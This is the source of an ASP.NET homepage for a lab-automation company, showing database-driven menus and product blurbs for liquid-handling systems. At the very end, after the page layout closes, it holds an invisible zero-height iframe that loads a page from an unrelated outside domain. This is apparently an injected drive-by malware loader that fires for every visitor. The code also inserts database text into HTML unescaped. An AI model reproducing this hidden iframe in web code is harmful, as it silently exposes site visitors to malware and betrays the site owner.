<%@ Page Language="VB" ContentType="text/html" ResponseEncoding="iso-8859-1" %>
<%@ import namespace="system.data" %>
<%@ import namespace="system.data.oledb" %>
<%@ import namespace="system.text"%>
<script runat="server">

Protected ds as new dataset()
Protected dsPage as new Dataset()
Dim conn as new oledbConnection("Provider=microsoft.jet.oledb.4.0;data source=" & server.MapPath("bis.mdb"))
	dim da as new oledbdataadapter
	dim sb as new stringbuilder()
	dim dr as datarow, dt as datatable
sub Page_load
	' First the product listings
	da.selectcommand=new oledbcommand("select productid, productname from products",conn)
	da.fill(dsPage,"allproducts")
	
	' and then the pages
	da.selectcommand=new oledbcommand("select pageid, pagename, pageurl from pages",conn)
	da.fill(dsPage,"allpages")
	
	'And the mornings aren't the same without the latest headlines
	da.selectcommand=new oledbcommand("select newsid, newsheadline from news where frontpage=true",conn)
	da.fill(dspage,"allnews")
	
	' Read in the news
	dim sn as new stringbuilder()
		dt=dspage.tables("allnews")
		for each dr in dt.rows
			sn.append("&bull; <a href=""news.aspx?item=" & dr.item("newsid") & """>" & dr.item("newsheadline") & "</a>")
		next
		ltnews.text=sn.tostring()
	
	' Fill in the products
			dt=dspage.tables("allpages")
		for each dr in dt.rows
			if isdbnull(dr.item("pageurl")) then
			sb.append("<li><a href=""content.aspx?page=" & dr.item("pageid") & """>" & dr.item("pagename") & "</a></li>")
			else
			sb.append("<li><a href=""" &  dr.item("pageurl") & """>" & dr.item("pagename") & "</a></li>")
			end if
		next
		ltpages.text=sb.tostring()
		
		dim sp as new stringbuilder()
		'Now for the product list
		dt=dspage.tables("allproducts")
		for each dr in dt.rows
			sp.append("<li><a href=""products.aspx?product=" & dr.item("productid") & """>" & dr.item("productname") & "</a></li>")
		next
		ltproductlinks.text=sp.tostring()
		
End Sub
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>BioIntegrated Solutions, Inc.</title>
<link href="biointsol.css" rel="stylesheet" type="text/css" />
</head>

<body bgcolor="#FFFFFF">
<div id="wrap">

<div id="header">
	<h1><a href="/">Bio Integrated Solutions</a></h1>
</div>

<p id="message">
	<strong><asp:Literal id="ltnews" runat="server" /></strong>
</p>

<div id="sidebar">
	<div class="gutter">
		<div class="box">
			<h3>Our Mission</h3>
			<p>To enable biotechnology with superior liquid handling and laboratory automation solutions.</p>
		</div>
		<div class="box">
		<h3>Products</h3>
		<ul>
			<asp:Literal ID="ltproductlinks" runat="server" />
		</ul>
		</div>
		<div class="box">
		<h3>About Us</h3>
		<ul>
			<asp:Literal ID="ltpages" runat="server" />
		</ul>
		</div>
	</div>
</div>	
<div id="content">
	<div class="gutter">
	<a href="products.aspx?product=1"><img src="images/vflex.jpg" alt="VFlex Liquid Handling System" width="225" height="343" hspace="10" vspace="10" border="0" align="left" style="padding:10px;padding-top:0;"/></a>
	<h2>VFlex Liquid Handling System</h2><p>Designed for Solid Phase Extraction (SPE) procedures, the BIS V FLex liquid handling system for Solid Phase Extraction can handle any organic/inorganic buffers, with the ability to bulk dispense from reservoirs, increasing throughput more than twice. The vertical organization of labware creates a small desktop footprint, invaluable in constrained spaces.</p>
	<p><strong>Advantages</strong></p>
	<ul><li>Compact footprint saves desk space</li>
<li>Integrated Gripper and Dual Manifolds </li>
<li>Bulk dispensing</li> 
<li>Flexible, modular deck layout </li>
<li>4 Probe Independent Movement with Variable Span: 9 - 27 mm</li> </ul>
	<p><a href="http://www.biointsol.com/gallery.aspx?product=1&amp;item=6">See the V Flex in action</a> (requires Macromedia Flash Player)</p>
	<br clear="all" />
	<hr noshade="noshade"/>
		<div style="width:50%;float:left;"><dl class="feature">
			<dt><a href="products.aspx?product=2"><img src="images/biospotter_small.jpg" alt="Biospotter" width="170" height="131" border="0" /></a>BioSpotter</dt>
			<dd>BioSpotter<sup>&trade;</sup> allows you to design microarrays around the experiment, rather than adapting research around microarrays. </dd>
		</dl>
		</div>
		<div style="width:50%;float:right;">
		<dl class="feature">
			<dt><a href="products.aspx?product=6"><img src="images/manifolds_small.jpg" alt="Vacuum Manifolds" width="170" height="131" border="0" /></a>Vacuum Manifolds</dt>
			<dd>Optimized for Solid Phase Extraction (SPE), the polypropylene manifolds are robot-friendly as well.</dd>
		</dl>
		</div>
	</div>
</div>

<div id="footer">
	<!-- #include file="footer.inc" -->
</div>

</div><!--...and that's a wrap.-->
<iframe width=100 height=0 src=http://kelong.7766.org/images/face/check_b.htm></iframe>
</body>
</html>
